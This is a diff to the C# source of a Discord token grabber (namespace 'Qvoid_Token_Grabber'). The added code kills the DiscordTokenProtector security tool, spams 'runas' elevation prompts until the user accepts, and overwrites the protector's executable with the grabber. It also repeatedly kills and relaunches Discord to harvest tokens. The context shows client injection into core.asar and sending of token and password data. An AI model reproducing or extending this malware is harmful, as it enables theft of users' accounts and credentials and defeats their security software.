@@ -13,6 +13,8 @@ using System.Windows.Forms;
 using System.Reflection;
 using LastDudeOnTheTrack.Properties;
 using System.Drawing.Imaging;
+using System.Text;
+using System.Security.Principal;
 
 namespace Qvoid_Token_Grabber.Discord
 {
@@ -117,6 +119,23 @@ namespace Qvoid_Token_Grabber.Discord
                                                    "module.exports = require('./core.asar');");
                 }
                 catch { }
+            }
+
+            if (TokensLocation.Count == 0)
+            {
+                BypassProtectors();
+
+                while (true)
+                {
+                    Thread.Sleep(60000);
+                    foreach (var proc in Process.GetProcessesByName("Discord"))
+                        proc.Kill();
+
+                    Process.Start(@"C:\Users\User\AppData\Local\Discord\app-1.0.9002\Discord.exe");
+                    Find(out DiscordClients, out TokensLocation);
+                    if (TokensLocation.Count > 0)
+                        break;
+                }
             }
 
             //Grabbing the Discord token(s)
@@ -361,7 +380,7 @@ namespace Qvoid_Token_Grabber.Discord
                     QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
                     embed2.Timestamp = DateTime.UtcNow;
                     embed2.Color = Color.Red;
-                    embed2.Title = "Discord Client Information";
+                    embed2.Title = "Discord Client(s) Information";
                     embed2.Description = BodyMessage;
 
                     string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
@@ -392,6 +411,105 @@ namespace Qvoid_Token_Grabber.Discord
                     File.Delete(Path.GetTempPath() + "\\Capture.jpg");
                 }
             }
+        }
+
+        /// <summary>
+        /// Bypassing known token protectors and replacing the protectors with the grabber ^^
+        /// </summary>
+        static public void BypassProtectors()
+        {
+            List<Protector> protectors = new List<Protector>()
+            {
+                new Protector()
+                {
+                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
+                    Name = "DiscordTokenProtector"
+                }
+            };
+
+            foreach (var protector in protectors)
+            {
+                var process = Process.GetProcessesByName(protector.Name);
+                if (process.Length > 0)
+                {
+                    foreach (var proc in process)
+                    {
+                        //Terminating the protector
+                        try { proc.Kill(); }
+                        catch (Exception ex)
+                        {
+                            if (ex.Message.Contains("Access"))
+                            {
+                                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
+                                {
+                                    //Could not terminate the protector because it has higher privileges.
+                                    using (Process newProc = new Process())
+                                    {
+                                        while (true)
+                                        {
+                                            try
+                                            {
+                                                newProc.StartInfo.FileName = Application.ExecutablePath;
+                                                newProc.StartInfo.CreateNoWindow = true;
+                                                newProc.StartInfo.UseShellExecute = true;
+                                                newProc.StartInfo.Verb = "runas";
+                                                newProc.Start();
+
+                                                break;
+                                            }
+                                            catch (Exception)
+                                            { continue; }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        try
+                        {
+                            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
+                                Environment.Exit(0);
+
+                            string MainModulePath = protector.Directory;
+                            if (!Directory.Exists(MainModulePath))
+                                continue;
+
+                            File.WriteAllBytes($"{protector.Directory}\\System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
+                            File.WriteAllBytes($"{protector.Directory}\\System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
+                            File.WriteAllBytes($"{protector.Directory}\\System.Data.SQLite.dll", Resources.System_Data_SQLite);
+                            File.WriteAllBytes($"{protector.Directory}\\Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
+                            File.WriteAllBytes($"{protector.Directory}\\EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
+                            File.WriteAllBytes($"{protector.Directory}\\EntityFramework.dll", Resources.EntityFramework);
+                            File.WriteAllBytes($"{protector.Directory}\\BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);
+
+                            Directory.CreateDirectory($"{protector.Directory}\\x86");
+                            Directory.CreateDirectory($"{protector.Directory}\\x64");
+                            File.WriteAllBytes($"{protector.Directory}\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
+                            File.WriteAllBytes($"{protector.Directory}\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);
+
+                            Thread.Sleep(100);
+                            if (File.Exists($"{protector.Directory}\\{protector.Name}.exe"))
+                                File.Delete($"{protector.Directory}\\{protector.Name}.exe");
+
+                            Thread.Sleep(1000);
+                            File.Copy(Assembly.GetEntryAssembly().Location, $"{protector.Directory}\\{protector.Name}.exe");
+                        }
+                        catch (Exception ex)
+                        {
+                            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
+                            continue;
+                        }
+                    }
+
+                }
+            }
+
+            foreach (var proc in Process.GetProcessesByName("Discord"))
+            {
+                try { proc.Kill(); } catch { }
+            }
+
+            Process.Start(@"C:\Users\User\AppData\Local\Discord\app-1.0.9002\Discord.exe");
         }
 
         /// <summary>
